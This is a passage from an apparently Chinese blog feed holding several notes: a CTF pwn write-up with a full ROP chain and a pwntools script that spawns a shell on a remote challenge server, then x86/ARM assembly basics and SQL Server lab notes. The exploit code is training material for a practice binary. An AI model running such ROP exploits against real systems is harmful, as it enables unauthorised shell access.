pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .datap += pack(&#39;&lt;I&#39;, 0x0806fcf1) # pop ecx ; pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x080eb060) # padding without overwrite ebxp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x08049423) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0806d8a5) # int 0x80</code></pre><p>加上自己算的偏移</p><pre><code class="python">from pwn import *from struct import packelf = ELF(&quot;./not_the_same_3dsctf_2016&quot;)#sh = process(&quot;./not_the_same_3dsctf_2016&quot;)sh = remote(&quot;node3.buuoj.cn&quot;,26066)context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;p = cyclic(0x2D)p += &#39;&#39;p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .datap += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; retp += &#39;/bin&#39;p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; retp += &#39;//sh&#39;p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x08049423) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x080481ad) # pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .datap += pack(&#39;&lt;I&#39;, 0x0806fcf1) # pop ecx ; pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x080eb060) # padding without overwrite ebxp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x08049423) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0806d8a5) # int 0x80sh.sendline(p)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编基础</title>
    <link href="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="X86汇编基础"><a href="#X86汇编基础" class="headerlink" title="X86汇编基础"></a>X86汇编基础</h2><p>==Intel和AT&amp;T语法区别：==</p><ul><li>Intel<strong>操作数</strong>在<strong>前面</strong>，AT&amp;T的在后面</li></ul><blockquote><p>在Intel语法中：<instruction> <destination operand> <source operand><br>在AT&amp;T语法中：<instruction> <source operand> <destination operand><br>有一个简单的记住它们的方法: 当你面对intel语法的时候，你可以想象把等号(=)放到2个操作数中间，当面对AT&amp;T语法的时候，你可以放一个右箭头(→）到两个操作数之间。</p></blockquote><ul><li>AT&amp;T: 寄存器名之前需要写一个百分号(%)并且在数字前面需要加上美元符($)。并用圆括号替代方括号</li><li>AT&amp;T: 以下是一些添加到操作符后，用来表示数据形式的后缀：<br>– q — quad (64 bits)<br>– l — long (32 bits)<br>– w — word (16 bits)<br>– b — byte (8 bits)</li></ul><hr><p><strong>重要：<code>MOV</code>指令在64位模式下，对低32位进行写入操作的时候，会清空高32位的内容[Int13]。比如 <code>MOV EAX，011223344h</code>将会把值写到RAX里，并且清空RAX的高32位区域。</strong></p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><blockquote><ol><li>EAX： 累加器</li><li>EBX： 基址寄存器</li><li>ECX： 计数器</li><li>EDX： 数据寄存器</li><li>ESI： 源变址寄存器</li><li>EDI： 目的变址寄存器</li><li>EBP： 扩展基址指针寄存器</li><li>ESP： 栈指针寄存器</li><li>EIP： 指令指针寄存器</li></ol><p>大多数寄存器失去了特殊用途，但<strong>ESP</strong>和<strong>EBP</strong>还是有特殊用途</p></blockquote><img src="2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20190821052642311.png" srcset="/img/loading.gif" class="" title="image-20190821052642311"><h3 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h3><blockquote><p>.data</p><p>Var :</p><p>​        .byte 64 ;  声明一个字节型变量var，对应值为64</p><p>​        .byte 10 ；声明一个数据10，这个数据没有所谓的“标签”，它的内存地址就是 var + 1.</p></blockquote><pre><code>.byte        声明1个字节的数据.short    声明2个字节的数据.long        声明4个字节的数据</code></pre><h4 id="操作后缀"><a href="#操作后缀" class="headerlink" title="操作后缀"></a>操作后缀</h4><pre><code>movb $2,(%ebx);    将2移入到ebx中的值所表示的地址单元中movw $2,(%ebx); 将16位整数2移动到    ebx中的值所表示的地址单元    开始的两个字节中movl $2,(%ebx); 将32位整数2移动到 ebx中的值所表示的地址单元 开始的四个字节中</code></pre><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><h3 id="mov-lt-reg-lt-reg"><a href="#mov-lt-reg-lt-reg" class="headerlink" title="mov &lt;reg, &lt;reg"></a>mov &lt;reg, &lt;reg</h3><blockquote><p>mov默认对寄存器值或变量值进行操作，可以从寄存器到寄存器，从立即数到寄存器，从存储单元到寄存器，从立即数到存储单元，从寄存器到存储单元</p></blockquote><p>将数据从第一个参数（即寄存器中的内容，内存单元中的内容，或者一个参数值）复制到第二个参数（即寄存器或者内存单元）。</p><p>但寄存器复制到寄存器可行时，直接地从内存单元中将数据移动到另一内存单元中是不可以的，必须把内存单元中的数据加载到一个寄存器中，然后才可以通过寄存器把<strong>数据</strong>移动到目标内存单元中。</p><h3 id="push-入栈"><a href="#push-入栈" class="headerlink" title="push 入栈"></a>push 入栈</h3><p>push先将ESP中的值减少4，然后将push 的参数移动到一个32位的地址单元（%esp）.esp地址从高地址到低地址逐渐减少，就像1000到0，先占1000，再999……空间有限</p><h3 id="pop-出栈"><a href="#pop-出栈" class="headerlink" title="pop 出栈"></a>pop 出栈</h3><p>先将内存（%esp）中4个字节的数据放到指定寄存器或者内存单元中，然后让esp+4</p><h3 id="lea-加载有效地址"><a href="#lea-加载有效地址" class="headerlink" title="lea 加载有效地址"></a>lea 加载有效地址</h3><p>将其第一个参数指定的内存单元 放入到 第二个参数指定的寄存器中。只计算有效地址并将其放入寄存器中。</p><h3 id="lea和mov的区别"><a href="#lea和mov的区别" class="headerlink" title="lea和mov的区别"></a>lea和mov的区别</h3><p>mov:</p><ul><li>对于变量，有无[ ] 都是取值</li><li>对于寄存器，无[ ] 表示取值，有[ ] 表示取地址</li></ul><p>Lea:</p><ul><li>对于变量，有无 都是取地址</li><li>对于寄存器，无[ ]表示取地址，有[ ] 表示取值</li></ul><h3 id="imul-整数相乘"><a href="#imul-整数相乘" class="headerlink" title="imul 整数相乘"></a>imul 整数相乘</h3><ul><li>两个参数的：先将两个参数相乘，然后把结果存在第二个参数（必须是一个寄存器）中</li><li>三个参数的：第一个（必须是常数）和第二个参数相乘，存在第三个参数（寄存器中）</li></ul><h3 id="idiv-整数相除"><a href="#idiv-整数相除" class="headerlink" title="idiv 整数相除"></a>idiv 整数相除</h3><p>只有一个操作数，为除数，被除数为EDX：EAX中的内容，商存在EAX中，余数存在EDX</p><h3 id="shl，shr-按位左移或者右移"><a href="#shl，shr-按位左移或者右移" class="headerlink" title="shl，shr 按位左移或者右移"></a>shl，shr 按位左移或者右移</h3><p>对第一个参数进行位运算，移动位数由第二个参数决定</p><hr><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p><code>STMFD SP!, {R4, LR}</code>，这条指令类似x86平台的<code>PUSH</code>指令，它会把2个寄存器（R4和LR）的值写到栈里。不过为了简化，在<code>armcc</code>编译器输出的汇编代码里会写成`PUSH {R4, LR}</p><p>这指令首先会减少<code>SP</code>的值，这样它在栈中指向的空间就被释放，以留给新条目使用，然后将R4和LR的值存入被修改后的<code>SP</code>的储存区域中。</p><p>值得注意的是：<code>STMFD</code>指令是广义的<code>PUSH</code>指令(扩展了它的功能)，因为他能操作任何寄存器，不只是<code>SP</code>。换句话说，<code>STMFD</code>可以用于将一组寄存器储存在特定的内存地址上。</p><p><code>MOV R0， #0</code>这条语句，这条语句就是把0写入R0寄存器。这是因为C函数返回了0，返回值会放在R0里。</p><p>最后一条指令是<code>LDMFD SP!, R4,PC</code>，这是STMFD的逆指令。为了将初始值存入<code>R4</code>和<code>PC</code>寄存器里，这条指令会从栈上(或任何其他的内存区域)读取保存的值，并且增加堆栈指针<code>SP</code>的值。这非常类似x86平台里的<code>POP</code>指令。</p><p>最前面那条<code>STMFD</code>指令，将<code>R4</code>，和<code>LR</code>寄存器成对保存到栈中。在<code>LDMFD</code>执行的时候，<code>R4</code>和<code>PC</code>会被复原。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库复习笔记</title>
    <link href="/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="第一次实验"><a href="#第一次实验" class="headerlink" title="第一次实验"></a>第一次实验</h1><h2 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h2><pre><code class="mssql">create database stuhyyon (    name = stu,     filename=&#39;C:\stu_data.mdf&#39;,    size = 3mb,    maxsize = 500mb,    filegrowth = 10%)log on(    name = stu_log,    filename = &#39;D:\stu_log.ldf&#39;,    size=3mb,    maxsize = unlimited,    filegrowth = 1mb)</code></pre><h2 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h2><pre><code class="mssql">Alter database StuhyyModify file(    name = Stuhyy_log,    filename = &#39;H:\Stuhyy_log.ldf&#39;,    size = 10MB,    maxsize = 20MB,    fileGrowth = 5%)</code></pre><h2 id="添加数据库文件"><a href="#添加数据库文件" class="headerlink" title="添加数据库文件"></a>添加数据库文件</h2><pre><code class="mssql">Alter database Stuhyyadd file(    name = dataname,    filename = &#39;H:\dataname.ndf&#39;,    size = 20MB,    maxsize = 30MB,    filegrowth = 1MB)</code></pre><h2 id="新建-amp-修改数据表"><a href="#新建-amp-修改数据表" class="headerlink" title="新建&amp;修改数据表"></a>新建&amp;修改数据表</h2><pre><code class="mssql">Create Table Student(    Num int primary key,    Nam char(6) not null,    Birthday datetime)Create Table ChoseClass(    Num int primary key,    CNum int not null,    Score int not null.    check (100&gt;= Score and Score &gt;= 0))Alter Table Studentadd 学分 intALTER TABLE table_name DROP COLUMN column_name</code></pre><h3 id="添加外键约束"><a href="#添加外键约束" class="headerlink" title="添加外键约束"></a>添加外键约束</h3><pre><code class="mssql">Alter Table StudentAdd Constraint fk_stuNumForeign key(Num) references ChoseClass(Num)</code></pre><h1 id="第二次实验"><a href="#第二次实验" class="headerlink" title="第二次实验"></a>第二次实验</h1><h2 id="插入信息"><a href="#插入信息" class="headerlink" title="插入信息"></a>插入信息</h2><pre><code class="mssql">Insert Into studinfoValues(&#39;hyy&#39;,&#39;11&#39;，&#39;广东&#39;)</code></pre><h2 id="删除信息"><a href="#删除信息" class="headerlink" title="删除信息"></a>删除信息</h2><pre><code class="mssql">Delete From scwhere xxx = xxx</code></pre><h2 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h2><pre><code class="mssql">Backup database Stuhyy to disk = &#39;H:\StuhyyBackup.bak&#39;///Backup database Stuhyy to StuhyyBakBackup log Stuhyy_log to disk = &#39;H:\Stuhyy_logBackup.bak&#39;///Backup log Stuhyy_log to Stuhyy_log</code></pre><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><pre><code class="mssql">Restore Database Stuhyy from disk = &#39;H:\StuhyyBackup.bak&#39;</code></pre><h1 id="第三次实验"><a href="#第三次实验" class="headerlink" title="第三次实验"></a>第三次实验</h1><p><code>Select Distinct 学号 from sc</code></p><h2 id="对成绩进行降序-相同则按学号升序排序"><a href="#对成绩进行降序-相同则按学号升序排序" class="headerlink" title="对成绩进行降序,相同则按学号升序排序"></a>对成绩进行降序,相同则按学号升序排序</h2><pre><code class="mssql">Select 学号,成绩 From scWhere 课程号 = &#39;4&#39;Order by 成绩 desc,学号 asc</code></pre><h2 id="查询姓黄同学的信息"><a href="#查询姓黄同学的信息" class="headerlink" title="查询姓黄同学的信息"></a>查询姓黄同学的信息</h2><pre><code class="mssql">Select 姓名, 系部名称 From StudinfoWhere 姓名 like &#39;咩%&#39; and 系部名称 in (&#39;国传&#39;,&#39;媒体工程&#39;) </code></pre><h2 id="查询选修人数超过10人的课程号"><a href="#查询选修人数超过10人的课程号" class="headerlink" title="查询选修人数超过10人的课程号"></a>查询选修人数超过10人的课程号</h2><pre><code class="mssql">Select 课程号,Count(*) as 选课人数  From scGroup By 课程号Having Count (*) &gt; 10</code></pre><h2 id="查询每门课最高分，最低分"><a href="#查询每门课最高分，最低分" class="headerlink" title="==查询每门课最高分，最低分=="></a>==查询每门课最高分，最低分==</h2><h2 id="查询选修了课程的学生姓名及选修课程的最高分"><a href="#查询选修了课程的学生姓名及选修课程的最高分" class="headerlink" title="查询选修了课程的学生姓名及选修课程的最高分"></a>查询选修了课程的学生姓名及选修课程的最高分</h2><pre><code class="mssql">Select Studinfo.姓名,Max(sc.成绩) as 最高成绩 From scRight Outer Join Studinfo on Studinfo.学号 = sc.学号Group by Studinfo.姓名</code></pre><h2 id="right-outer-join-left-inner-join"><a href="#right-outer-join-left-inner-join" class="headerlink" title="==right outer join  left inner join=="></a>==right outer join  left inner join==</h2><p>　　left join(左联接) 返回包括<strong>左表中的所有记录和右表中联结字段相等</strong>的记录  以左表为主<br>　　right join(右联接) 返回包括<strong>右表中的所有记录和左表中联结字段相等</strong>的记录 以右表为主<br>　　inner join(等值连接) 只返回两个表中联结字段相等的行</p><blockquote><p>   outer join(外连接) 可分为左外连接left outer join和右外连接right outer join</p><p>left join 是 left outer join 的简写，两者含义一样的。<br>right join 是 right outer join 的简写，两者含义一样的</p></blockquote><h1 id="第四次实验"><a href="#第四次实验" class="headerlink" title="第四次实验"></a>第四次实验</h1><h2 id="T-sql创建学生视图"><a href="#T-sql创建学生视图" class="headerlink" title="T-sql创建学生视图"></a>T-sql创建学生视图</h2><pre><code class="mssql">Create View ASSelect Studinfo.学号，Studinfo.系部名称,Course.课程名，Sc.成绩 From Studinfo,sc,CourseWhere Studinfo.学号 = sc.学号 And sc.课程号 = course.课程号 And Studinfo.系部名称 = &#39;媒体工程&#39;With Check Option</code></pre><blockquote><p>对视图进行update或者insert操作时，保证更新或者插入的行满足图中定义的谓词条件 假如一张表里有个字段是专业的;你创建视图的时候 create view stu as select 学生 from table where 专业=’计算机’ with check option 这样where后面就实现了对专业的限定 以后你如果对视图添加记录的时候专业如果不是计算机的话不让添加进去的<br>————————————————<br>版权声明：本文为CSDN博主「ClearLoveQ」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/ClearLoveQ/article/details/84285060" target="_blank" rel="noopener">https://blog.csdn.net/ClearLoveQ/article/details/84285060</a></p></blockquote><h1 id="第五次实验"><a href="#第五次实验" class="headerlink" title="第五次实验"></a>第五次实验</h1><h2 id="声明局部变量"><a href="#声明局部变量" class="headerlink" title="声明局部变量"></a>声明局部变量</h2><pre><code class="mssql">Declare @max date , @min dateset @max = (select Max(出生日期) from studinfo)set @min = (select Min(出生日期) from studinfo)select @max as 最大出生日期 , @min as 最小出生日期</code></pre><p>小知识</p><blockquote><p>①date类型可用于需要一个日期值而不需要时间部分时；</p><p>②datetime类型:可用于需要同时包含日期和时间信息的值。</p></blockquote><h2 id="Case的使用"><a href="#Case的使用" class="headerlink" title="Case的使用"></a>Case的使用</h2><pre><code class="mssql">Select 姓名,课程名,成绩 =Case    when 成绩 &gt; 90 then &#39;A&#39;    when 成绩 &gt; 80 then &#39;B&#39;    when 成绩 &gt; 70 then &#39;C&#39;    when 成绩 &gt; 60 then &#39;D&#39;    else &#39;E&#39;EndFrom scinner join studinfo on sc.学号 = studinfo.学号inner join course on sc.课程号 = course.课程号///如果存在If Exists(select * from studinfo)    select * from studinfo</code></pre><h2 id="声明游标，更新字段"><a href="#声明游标，更新字段" class="headerlink" title="声明游标，更新字段"></a>声明游标，更新字段</h2><pre><code class="mssql">Declare curor_mark CursorFor select 成绩 from scFor Update of 成绩Go///删除游标Deallocate curor_mark</code></pre><h2 id="游标定位操作"><a href="#游标定位操作" class="headerlink" title="游标定位操作"></a>游标定位操作</h2><p>定义基于sc的游标，分别将第三条记录，从当前记录开始向前第二条记录和最后一条记录显示在屏幕上</p><pre><code class="mssql">Declare cursor_mark Cursor ScrollFor    Select * from sc    inner join studinfo on sc.学号 = Studinfo.学号    inner join course on course.课程号 = sc.课程号Open course_markfetch absolute 3 from cursor_markfetch relative -2 from cursor_markfetch last from cursor_markClose cursor_markDeallocate cursor_mark</code></pre><h2 id="游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分"><a href="#游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分" class="headerlink" title="游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分"></a>游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分</h2><pre><code class="mssql">Declare @name char(20), @num intDeclare cursor_mark Cursor ScrollFor    Select 姓名,sc.学号 from sc    inner join studinfo on sc.学号 = studinfo.学号    inner join course on course.课程号 = sc.课程号For Update of 成绩Open cursor_markFetch Next from cursor_mark Into @name , @numwhile @@fetch_status = 0    Begin    if @name = &#39;女朋友&#39;        Update sc        set 成绩 = 成绩 + 5        where current of cursor_mark        Fetch Next from cursor_mark Into @name , @num    EndClose cursor_markDeallocate cursor_mark</code></pre><h2 id="给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score-gt-60则为“P”，否则为“F”"><a href="#给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score-gt-60则为“P”，否则为“F”" class="headerlink" title="给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score&gt;60则为“P”，否则为“F”"></a>给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score&gt;60则为“P”，否则为“F”</h2><pre><code class="mssql"> Alter Table sc Add 等级 char(2) null Go Begin     Update sc     set 等级 =          Case                 when 成绩 &gt;= 60 then &#39;P&#39;                 when 成绩 &lt; 60 then &#39;F&#39;                 End End</code></pre><p>==dateadd(year,1,出生日期) 出生日期的year + 1==</p><p>==month(出生日期) 取出生日期的month出来==</p><h1 id="第六次实验"><a href="#第六次实验" class="headerlink" title="第六次实验"></a>第六次实验</h1><h2 id="定义标量函数f-stud1-统计某学院的学生人数"><a href="#定义标量函数f-stud1-统计某学院的学生人数" class="headerlink" title="==定义标量函数f_stud1,统计某学院的学生人数=="></a>==定义标量函数f_stud1,统计某学院的学生人数==</h2><pre><code class="mssql">If Exists(select * from sysobjects where name = &#39;f_stud1&#39;)    drop function f_stud1GoCreate Function f_stud1(@nam char(10))return intAS    Begin        Declare @n int        set @n = (select count(*) from studinfo                 where 系部名称 = @nam)        return (@n)    EndGoSelect dbo.f_stud1(&#39;媒体工程&#39;) as 人数</code></pre><h2 id="定义一-内嵌表值函数-f-stud3，返回某学生选修课情况，包含姓名、课程名，分数等"><a href="#定义一-内嵌表值函数-f-stud3，返回某学生选修课情况，包含姓名、课程名，分数等" class="headerlink" title="定义一==内嵌表值函数==f_stud3，返回某学生选修课情况，包含姓名、课程名，分数等"></a>定义一==内嵌表值函数==f_stud3，返回某学生选修课情况，包含姓名、课程名，分数等</h2><pre><code class="mssql">Create Function f_stud3(@name nchar(10))return TableAs    return (select 姓名 ,课程名,成绩 from sc s           inner join studinfo on s.学号 = studinfo.学号           inner join course on s.学号 = course.学号           where 姓名 = @nam)Goselet * from dbo.f_stud3(&#39;Mie&#39;)</code></pre><h2 id="创建一个-带输入的存储过程-，通过调用上例的f-stud3，查询某学生的选修课程情况"><a href="#创建一个-带输入的存储过程-，通过调用上例的f-stud3，查询某学生的选修课程情况" class="headerlink" title="创建一个==带输入的存储过程==，通过调用上例的f_stud3，查询某学生的选修课程情况"></a>创建一个==带输入的存储过程==，通过调用上例的f_stud3，查询某学生的选修课程情况</h2><pre><code class="mssql">Create Procedure use_f_stud3(@nam nchar(10))AS    select * from dbo.f_stud3(@nam)GoExec use_f_stud3(&#39;Mie&#39;)</code></pre><p>==datediff(year,出生日期,getdate()) 获取年龄==</p><h2 id="定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空"><a href="#定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空" class="headerlink" title="==定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空=="></a>==定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空==</h2><pre><code class="mssql">create function f_tableinfo(@tableName nvarchar(200))returns @result table (ColName nvarchar(200),ColType nvarchar(200),ColLength int,ColIsNull bit)as    begin        insert into @result(ColName,ColType,ColLength,ColIsNull)    select        c.[name] as ColumnName,        t.[name] as ColumnType,        c.max_length as MaxLength,        c.is_nullable as [IsNull]    from sys.columns c    inner join sys.types t on c.system_type_id=t.system_type_id    Where c.[object_id]=object_id(@tableName) and t.[name]&lt;&gt;&#39;sysname&#39;    Order by c.column_id    Return    EndGoselect * from f_tableinfo(&#39;Studinfo&#39;)</code></pre><h1 id="第七次实验"><a href="#第七次实验" class="headerlink" title="第七次实验"></a>第七次实验</h1><h2 id="使用存储过程新建department-系部人数，总人数，男生人数，女生人数-，用SQL语句从学生表中采集相应信息添加到系部表中。"><a href="#使用存储过程新建department-系部人数，总人数，男生人数，女生人数-，用SQL语句从学生表中采集相应信息添加到系部表中。" class="headerlink" title="使用存储过程新建department(系部人数，总人数，男生人数，女生人数)，用SQL语句从学生表中采集相应信息添加到系部表中。"></a>使用存储过程新建department(系部人数，总人数，男生人数，女生人数)，用SQL语句从学生表中采集相应信息添加到系部表中。</h2><pre><code class="mssql">Create Procedure p_stuXibuAs    select 系部名称 as 系部名称,count(*) as 总人数,        sum(case 姓名 when &#39;女&#39; then 1 else 0 End) as 女生人数        sum(case 姓名 when &#39;男&#39; then 1 else 0 End) as 男生人数    into 系部表 From studinfo    Group by 系部名称Gop_stuXiBu</code></pre><h2 id="创建触发器tr-stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果"><a href="#创建触发器tr-stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果" class="headerlink" title="创建触发器tr_stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果"></a>创建触发器tr_stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果</h2><pre><code class="mssql">Create trigger tr_stud1 on courseFor InsertAs    select * from inserted</code></pre><h2 id="建立一个命名事务trans-credit，当学号为-sid的学生所选的课程（课程编号为-cid）的总学分没有超过10时，将学号和课程编号值（-sid-cid）添加到grade表中，同时修改stu-credit表中的总学分，使总学分为当前总学分-所选课程的学分值（-cre），否则，取消该事务，实现回滚。"><a href="#建立一个命名事务trans-credit，当学号为-sid的学生所选的课程（课程编号为-cid）的总学分没有超过10时，将学号和课程编号值（-sid-cid）添加到grade表中，同时修改stu-credit表中的总学分，使总学分为当前总学分-所选课程的学分值（-cre），否则，取消该事务，实现回滚。" class="headerlink" title="建立一个命名事务trans_credit，当学号为@sid的学生所选的课程（课程编号为@cid）的总学分没有超过10时，将学号和课程编号值（@sid,@cid）添加到grade表中，同时修改stu_credit表中的总学分，使总学分为当前总学分+所选课程的学分值（@cre），否则，取消该事务，实现回滚。"></a>建立一个命名事务trans_credit，当学号为@sid的学生所选的课程（课程编号为@cid）的总学分没有超过10时，将学号和课程编号值（@sid,@cid）添加到grade表中，同时修改stu_credit表中的总学分，使总学分为当前总学分+所选课程的学分值（@cre），否则，取消该事务，实现回滚。</h2><pre><code class="mssql">use Stuhyygoif exists(select * from sys.all_objects where name = &#39;trans_credit&#39;)    drop trigger trans_creditgocreate trigger trans_credit on stu_creditfor insertas    BEGIN TRAN 选课        --save tran 选课        declare @sid char(10),@cid char(10),@mark int,@totalmark int        set @sid = (select 学号 from inserted)        set @cid = (select 课程号 from inserted)        set @mark = (select 学分 from inserted)        set @totalmark = (select 总学分 from stu_credit where 学号 = @sid) + @mark        if @totalmark &gt;10            BEGIN                print &#39;超出总学分!选课失败！&#39;                rollback tran 选课            END        else            BEGIN            update stu_credit set 总学分 = @totalmark where 学号 = @sid            if OBJECT_ID(N&#39;grade&#39;,N&#39;U&#39;) is not null                insert into grade                 Values(@sid,@cid)            else                 create table student  --创建表student                (学号 char(10) ,                课程号 char(10),                )                insert into grade                 Values(@sid,@cid)                END    commit TRAN 选课    GOGO</code></pre><h1 id="第八次实验"><a href="#第八次实验" class="headerlink" title="第八次实验"></a>第八次实验</h1><h2 id="用T-Sql语句创建sql-server-登录1-test-w1-登录密码为12345-默认访问pubs"><a href="#用T-Sql语句创建sql-server-登录1-test-w1-登录密码为12345-默认访问pubs" class="headerlink" title="用T-Sql语句创建sql server 登录1_test_w1,登录密码为12345,默认访问pubs"></a>用T-Sql语句创建sql server 登录1_test_w1,登录密码为12345,默认访问pubs</h2><pre><code class="mssql">sp_addlogin@loginame = &#39;Mie&#39;@passwd = &#39;12345&#39;@dfdb = &#39;pubs&#39;</code></pre><h2 id="授予Windows用户连接到sql-server的权利"><a href="#授予Windows用户连接到sql-server的权利" class="headerlink" title="授予Windows用户连接到sql server的权利"></a>授予Windows用户连接到sql server的权利</h2><pre><code class="mssql">EXEC sp_grantloging ‘CSUSQL\1_test_w2’Sp_addlogin@loginame = &#39;1_test_s2&#39;@defdb = &#39;Stuhyy&#39;</code></pre><h2 id="添加数据库用户"><a href="#添加数据库用户" class="headerlink" title="添加数据库用户"></a>添加数据库用户</h2><pre><code class="mssql">EXEC sp_grantdbaccess &#39;u_test_w1&#39;</code></pre><h2 id="禁止用户u-test-s1-对course表的插入和删除权限，撤销对studinfo的更新权限"><a href="#禁止用户u-test-s1-对course表的插入和删除权限，撤销对studinfo的更新权限" class="headerlink" title="禁止用户u_test_s1 对course表的插入和删除权限，撤销对studinfo的更新权限"></a>禁止用户u_test_s1 对course表的插入和删除权限，撤销对studinfo的更新权限</h2><pre><code class="mssql">GRANT    DENY Insert,Delete On course    Revoke Update on Studinfo</code></pre><h2 id="对用户u-test-s1添加成员r-test-s1"><a href="#对用户u-test-s1添加成员r-test-s1" class="headerlink" title="对用户u_test_s1添加成员r_test_s1"></a>对用户u_test_s1添加成员r_test_s1</h2><pre><code class="mssql">EXEC Sp_addrolemember &#39;u_test_s1&#39; , &#39;r_test_s1&#39;</code></pre><h2 id="删除账户"><a href="#删除账户" class="headerlink" title="删除账户"></a>删除账户</h2><pre><code class="mssql">Sp_revokelogin &#39;u_test_w1&#39;Sp_revokelogin &#39;u_test_s1&#39;</code></pre><h2 id="删除数据库中用户"><a 